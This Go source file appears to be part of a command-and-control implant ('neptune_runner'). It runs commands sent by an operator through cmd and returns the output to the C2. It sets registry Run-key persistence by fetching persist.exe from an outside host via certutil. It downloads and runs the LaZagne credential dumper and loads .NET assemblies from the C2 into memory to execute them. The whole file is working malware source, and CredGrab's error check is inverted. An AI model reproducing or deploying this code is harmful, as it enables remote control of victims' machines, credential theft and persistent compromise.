package misc

import (
	"encoding/base64"
	b64 "encoding/base64"
	"fmt"
	"github.com/Ne0nd0g/go-clr"
	"log"
	"neptune_runner/communication"
	"neptune_runner/config"
	"neptune_runner/logging"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

func CommandBuiltin(task config.WrappedTaskStep) bool {
	var output string

	var taskStatus int

	taskCommand := task.TaskStepRequest.Payload["command"]

	cmd := exec.Command("cmd")
	cmd.SysProcAttr = &syscall.SysProcAttr{}
	cmd.SysProcAttr.CmdLine = `cmd /c ` + taskCommand

	rawOutput, err := cmd.CombinedOutput()

	if err != nil {
		taskStatus = communication.TASK_ERROR
	} else {
		taskStatus = communication.TASK_SUCCESS
	}

	output = base64.StdEncoding.EncodeToString(rawOutput)

	task.TaskStepResponse.StatusId = taskStatus
	task.TaskStepResponse.Data = output

	communication.ReplyToTask(task)

	return taskStatus == communication.TASK_SUCCESS
}

func CommandAsString(parameter string) string {
	if c, err := exec.Command("cmd", "/c", parameter).CombinedOutput(); err != nil {
		logging.Info(parameter)
		logging.Info(string(c))
		log.Fatal(err)
		return string(c)
	} else {
		return string(c)
	}
}

func SetPersistence(method string, name string, file string) {
	if method == "registryCurrentUserRun" {
		InjectRemote(config.Config.Path.CertUtil, "persist.exe "+file+" "+"hkcu"+" "+name, "http://apb.sh/persist.exe")
	} else {
		InjectRemote(config.Config.Path.CertUtil, "persist.exe "+file+" "+"hklm"+" "+name, "http://apb.sh/persist.exe")
	}
}

func CredGrab(task config.WrappedTaskStep) bool {
	myAppData, _ := os.UserConfigDir()

	filePath := fmt.Sprintf(config.API_URL + "/implant/" + config.GlobalState.Id + "/files/" + config.BinaryTypes.Lazagne)

	err := DownloadFile(myAppData+"\\laz.exe", filePath)

	if err != nil {
		tmp := CommandAsString(myAppData + "\\laz.exe all -oJ")

		task.TaskStepResponse.StatusId = communication.TASK_SUCCESS
		task.TaskStepResponse.Data = tmp

	} else {
		task.TaskStepResponse.StatusId = communication.TASK_ERROR
		task.TaskStepResponse.Data = "The file could not be downloaded and written to disk"
	}

	communication.ReplyToTask(task)

	return task.TaskStepResponse.StatusId == communication.TASK_SUCCESS
}

func DownloadFile(filepath string, url string) error {
	content, err := communication.HttpGetRequest(url)

	// Create the file
	out, err := os.Create(filepath)

	if err != nil {
		return err
	}

	defer out.Close()

	_, err = out.Write(content)

	if err != nil {
		return err
	}

	return nil
}

func InMemoryExecDotnet(task config.WrappedTaskStep) bool {
	filePath := fmt.Sprintf(config.API_URL + task.TaskStepRequest.Payload["binaryPath"])
	err := clr.RedirectStdoutStderr()
	if err != nil {
		log.Fatal(err)
	}
	//debug := flag.Bool("debug", true, "Enable debug output")
	runtimeHost, _ := clr.LoadCLR("v4")
	binaryBytes := communication.SendGetToC2Panel(filePath)
	methodInfo, _ := clr.LoadAssembly(runtimeHost, binaryBytes)
	stringArray := strings.Fields(task.TaskStepRequest.Payload["command"])
	stdout, _ := clr.InvokeAssembly(methodInfo, stringArray)

	task.TaskStepResponse.StatusId = communication.TASK_SUCCESS
	task.TaskStepResponse.Data = b64.StdEncoding.EncodeToString([]byte(stdout))

	communication.ReplyToTask(task)
	//if *debug {
	//	fmt.Println(stdout)
	//}

	return task.TaskStepResponse.StatusId == communication.TASK_SUCCESS
}
